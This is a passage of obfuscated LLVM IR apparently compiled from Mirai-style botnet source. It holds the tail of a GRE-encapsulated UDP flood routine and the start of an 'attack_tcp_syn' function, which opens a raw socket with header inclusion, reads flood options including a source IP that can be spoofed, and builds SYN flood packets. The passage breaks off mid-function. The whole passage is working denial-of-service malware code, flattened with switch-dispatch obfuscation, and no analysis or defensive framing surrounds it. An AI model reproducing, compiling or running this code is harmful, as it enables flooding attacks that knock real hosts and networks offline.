  store i8* %282, i8** %33, align 8
  %283 = load i8*, i8** %33, align 8
  %284 = bitcast i8* %283 to %struct.iphdr*
  store %struct.iphdr* %284, %struct.iphdr** %34, align 8
  %285 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i64 1
  %287 = bitcast %struct.iphdr* %286 to %struct.grehdr*
  store %struct.grehdr* %287, %struct.grehdr** %35, align 8
  %288 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %289 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %288, i64 1
  %290 = bitcast %struct.grehdr* %289 to %struct.ethhdr*
  store %struct.ethhdr* %290, %struct.ethhdr** %36, align 8
  %291 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %292 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %291, i64 1
  %293 = bitcast %struct.ethhdr* %292 to %struct.iphdr*
  store %struct.iphdr* %293, %struct.iphdr** %37, align 8
  %294 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i64 1
  %296 = bitcast %struct.iphdr* %295 to %struct.udphdr*
  store %struct.udphdr* %296, %struct.udphdr** %38, align 8
  %297 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i64 1
  %299 = bitcast %struct.udphdr* %298 to i8*
  store i8* %299, i8** %39, align 8
  %300 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %301 = load i32, i32* %11, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %303, i32 0, i32 2
  %305 = load i8, i8* %304, align 4
  %306 = zext i8 %305 to i32
  %307 = icmp slt i32 %306, 32
  %308 = select i1 %307, i32 2047567103, i32 531598105
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 %315) #7
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %319 = load i32, i32* %11, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 %326) #7
  %328 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  store i32 531598105, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %23, align 4
  %332 = icmp eq i32 %331, -1
  %333 = select i1 %332, i32 312995361, i32 551767015
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i32 @rand_next()
  %336 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 8
  store i32 %335, i32* %337, align 4
  store i32 551767015, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i16, i16* %15, align 2
  %340 = zext i16 %339 to i32
  %341 = icmp eq i32 %340, 65535
  %342 = select i1 %341, i32 -2045073719, i32 -887127950
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = call i32 @rand_next()
  %345 = and i32 %344, 65535
  %346 = trunc i32 %345 to i16
  %347 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 3
  store i16 %346, i16* %348, align 4
  %349 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 3
  %351 = load i16, i16* %350, align 4
  %352 = zext i16 %351 to i32
  %353 = sub nsw i32 %352, 1000
  %354 = xor i32 %353, -1
  %355 = trunc i32 %354 to i16
  %356 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i32 0, i32 3
  store i16 %355, i16* %357, align 4
  store i32 -887127950, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i16, i16* %18, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 65535
  %362 = select i1 %361, i32 -577808259, i32 1198014889
  store i32 %362, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = call i32 @rand_next()
  %365 = and i32 %364, 65535
  %366 = trunc i32 %365 to i16
  %367 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %368 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %367, i32 0, i32 0
  store i16 %366, i16* %368, align 2
  store i32 1198014889, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i16, i16* %19, align 2
  %371 = zext i16 %370 to i32
  %372 = icmp eq i32 %371, 65535
  %373 = select i1 %372, i32 1831989617, i32 703521535
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = call i32 @rand_next()
  %376 = and i32 %375, 65535
  %377 = trunc i32 %376 to i16
  %378 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %379 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %378, i32 0, i32 1
  store i16 %377, i16* %379, align 2
  store i32 703521535, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load i8, i8* %22, align 1
  %382 = icmp ne i8 %381, 0
  %383 = select i1 %382, i32 -1527644927, i32 -30212044
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 9
  store i32 %385, i32* %387, align 4
  store i32 -743498740, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 9
  %391 = load i32, i32* %390, align 4
  %392 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  store i32 -743498740, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  store i32 %395, i32* %40, align 4
  %396 = call i32 @rand_next()
  store i32 %396, i32* %41, align 4
  %397 = call i32 @rand_next()
  store i32 %397, i32* %42, align 4
  %398 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 0
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %400, i8* %401, i32 4)
  %402 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %403 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %402, i32 0, i32 1
  %404 = getelementptr inbounds [6 x i8], [6 x i8]* %403, i32 0, i32 0
  %405 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %404, i8* %405, i32 4)
  %406 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %407 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %406, i32 0, i32 0
  %408 = getelementptr inbounds [6 x i8], [6 x i8]* %407, i32 0, i32 0
  %409 = getelementptr inbounds i8, i8* %408, i64 4
  %410 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %409, i8* %410, i32 2)
  %411 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %412 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %411, i32 0, i32 1
  %413 = getelementptr inbounds [6 x i8], [6 x i8]* %412, i32 0, i32 0
  %414 = getelementptr inbounds i8, i8* %413, i64 4
  %415 = bitcast i32* %42 to i8*
  %416 = getelementptr inbounds i8, i8* %415, i64 2
  call void @util_memcpy(i8* %414, i8* %416, i32 2)
  %417 = load i8, i8* %21, align 1
  %418 = icmp ne i8 %417, 0
  %419 = select i1 %418, i32 675631217, i32 -701296198
  store i32 %419, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load i8*, i8** %39, align 8
  %422 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %421, i32 %422)
  %423 = load i8*, i8** %39, align 8
  %424 = load i32, i32* %20, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds i8, i8* %423, i64 %425
  store i8 0, i8* %426, align 1
  store i32 -701296198, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %431 = bitcast %struct.iphdr* %430 to i16*
  %432 = call zeroext i16 @checksum_generic(i16* %431, i32 20)
  %433 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 7
  store i16 %432, i16* %434, align 2
  %435 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 7
  store i16 0, i16* %436, align 2
  %437 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %438 = bitcast %struct.iphdr* %437 to i16*
  %439 = call zeroext i16 @checksum_generic(i16* %438, i32 20)
  %440 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 7
  store i16 %439, i16* %441, align 2
  %442 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 3
  store i16 0, i16* %443, align 2
  %444 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %445 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %446 = bitcast %struct.udphdr* %445 to i8*
  %447 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %448 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %447, i32 0, i32 2
  %449 = load i16, i16* %448, align 2
  %450 = load i32, i32* %20, align 4
  %451 = sext i32 %450 to i64
  %452 = add i64 8, %451
  %453 = trunc i64 %452 to i32
  %454 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %444, i8* %446, i16 zeroext %449, i32 %453)
  %455 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %456 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %455, i32 0, i32 3
  store i16 %454, i16* %456, align 2
  %457 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %458 = load i32, i32* %11, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i64 %459
  %461 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %460, i32 0, i32 0
  %462 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %461, i32 0, i32 0
  store i16 2, i16* %462, align 4
  %463 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 9
  %465 = load i32, i32* %464, align 4
  %466 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %467 = load i32, i32* %11, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i64 %468
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i32 0, i32 0
  %471 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %470, i32 0, i32 2
  %472 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %471, i32 0, i32 0
  store i32 %465, i32* %472, align 4
  %473 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %474 = load i32, i32* %11, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 0
  %478 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %477, i32 0, i32 1
  store i16 0, i16* %478, align 2
  %479 = load i32, i32* %12, align 4
  %480 = load i8*, i8** %33, align 8
  %481 = load i32, i32* %20, align 4
  %482 = sext i32 %481 to i64
  %483 = add i64 66, %482
  %484 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %485 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %486 = load i32, i32* %11, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %485, i64 %487
  %489 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i32 0, i32 0
  %490 = bitcast %struct.sockaddr_in* %489 to %struct.sockaddr*
  store %struct.sockaddr* %490, %struct.sockaddr** %484, align 8
  %491 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %492 = load %struct.sockaddr*, %struct.sockaddr** %491, align 8
  %493 = call i64 @sendto(i32 %479, i8* %480, i64 %483, i32 16384, %struct.sockaddr* %492, i32 16)
  store i32 108923829, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i32, i32* %11, align 4
  %496 = add nsw i32 %495, 1
  store i32 %496, i32* %11, align 4
  store i32 1226545527, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i32, i32* %24, align 4
  %500 = sext i32 %499 to i64
  %501 = icmp sgt i64 %498, %500
  %502 = select i1 %501, i32 -490230844, i32 -859993344
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  store i32 1698751707, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  store i32 1882423928, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %504, %503, %497, %494, %427, %420, %394, %388, %384, %380, %374, %369, %363, %358, %343, %338, %334, %330, %309, %277, %271, %270, %269, %266, %250, %242, %236, %227, %223, %170, %166, %112, %106, %105, %102, %96, %95, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 19, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 702716658, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 702716658, label %first
    i32 1745181572, label %107
    i32 -163785981, label %108
    i32 429741655, label %114
    i32 -1571103906, label %117
    i32 -1091458834, label %118
    i32 -886495302, label %124
    i32 -645485744, label %168
    i32 -88554110, label %172
    i32 -2084913122, label %297
    i32 1853784688, label %300
    i32 1604389022, label %301
    i32 -1678218144, label %302
    i32 -649201656, label %308
    i32 825346973, label %328
    i32 -1502989306, label %349
    i32 -1992585658, label %353
    i32 -623265862, label %357
    i32 1033292932, label %362
    i32 1966710414, label %368
    i32 298574385, label %373
    i32 -654132899, label %379
    i32 315443832, label %384
    i32 1563610265, label %390
    i32 828656931, label %394
    i32 1365635996, label %398
    i32 106642565, label %402
    i32 -1041231301, label %406
    i32 -768212796, label %410
    i32 1577443489, label %416
    i32 543387550, label %454
    i32 -273903858, label %457
    i32 1409208917, label %463
    i32 1545376009, label %464
    i32 -760300997, label %465
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %105 = icmp eq i32 %.reload, -1
  %106 = select i1 %105, i32 1745181572, i32 -163785981
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 -760300997, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %109 = load i32, i32* %12, align 4
  %110 = bitcast i32* %11 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #6
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 429741655, i32 -1571103906
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %12, align 4
  %116 = call i32 @close(i32 %115)
  store i32 -760300997, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1091458834, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %11, align 4
  %120 = load i8, i8* %7, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  %123 = select i1 %122, i32 -886495302, i32 1853784688
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call noalias i8* @calloc(i64 128, i64 1) #6
  %126 = load i8**, i8*** %13, align 8
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %126, i64 %128
  store i8* %125, i8** %129, align 8
  %130 = load i8**, i8*** %13, align 8
  %131 = load i32, i32* %11, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8*, i8** %130, i64 %132
  %134 = load i8*, i8** %133, align 8
  %135 = bitcast i8* %134 to %struct.iphdr*
  store %struct.iphdr* %135, %struct.iphdr** %30, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i64 1
  %138 = bitcast %struct.iphdr* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %31, align 8
  %139 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i64 1
  %141 = bitcast %struct.tcphdr* %140 to i8*
  store i8* %141, i8** %32, align 8
  %142 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = and i8 %144, 15
  %146 = or i8 %145, 64
  store i8 %146, i8* %143, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, -16
  %151 = or i8 %150, 5
  store i8 %151, i8* %148, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 1
  store i8 %152, i8* %154, align 1
  %155 = call zeroext i16 @htons(i16 zeroext 60) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 2
  store i16 %155, i16* %157, align 2
  %158 = load i16, i16* %15, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 3
  store i16 %159, i16* %161, align 4
  %162 = load i8, i8* %16, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  store i8 %162, i8* %164, align 4
  %165 = load i8, i8* %17, align 1
  %166 = icmp ne i8 %165, 0
  %167 = select i1 %166, i32 -645485744, i32 -88554110
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  store i32 -88554110, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* %28, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %179 = load i32, i32* %11, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  store i32 %183, i32* %185, align 4
  %186 = load i16, i16* %18, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  store i16 %187, i16* %189, align 4
  %190 = load i16, i16* %19, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load i32, i32* %20, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = zext i16 %196 to i32
  %198 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 2
  store i32 %197, i32* %199, align 4
  %200 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 4
